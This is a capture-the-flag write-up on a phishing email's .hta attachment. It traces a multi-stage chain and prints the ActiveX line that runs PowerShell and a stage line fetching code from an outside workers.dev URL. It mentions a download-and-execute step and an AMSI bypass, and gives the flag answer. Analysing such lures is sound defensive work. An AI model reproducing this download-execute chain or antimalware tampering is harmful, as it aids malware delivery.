# Challenge Name

Company Discount

# Author

OddNorseman

# Description

A company discount email came with an `.hta` file. I had to figure out what the file was doing and follow the trail to the flag.

# Solution

The `.hta` file looked like an ordinary discount page until I reached the JavaScript near the end. It was starting PowerShell through `WScript.Shell`:

```javascript
new ActiveXObject('WScript.Shell').Run(c);
```

The command inside `c` used `iwr -UseBasicParsing` to download something from a URL and piped it into `iex`. That means the downloaded PowerShell wasn't just being saved; it was **run immediately**.

Rather than execute the suspicious command, I used `curl` to look at what the URL returned. The download contained another stage, including an obfuscated piece of PowerShell that referred to `AmsiUtils` and `amsiInitFailed`. That code was trying to interfere with Windows antimalware scanning.

More importantly, that stage also had another download URL:

```powershell
$follower = iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7
```

I used `curl` on this third-stage URL as well, and that's where the flag was. It ended up being a simple case of following the chain without running any of the payloads.

A small thing I picked up afterward was the meaning of `curl -sS`: `-s` hides the normal progress meter, while `-S` still shows errors. Handy when you're looking at command output in a terminal.

# Flag

```text
brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}
```

# Solved By

Kazikiri
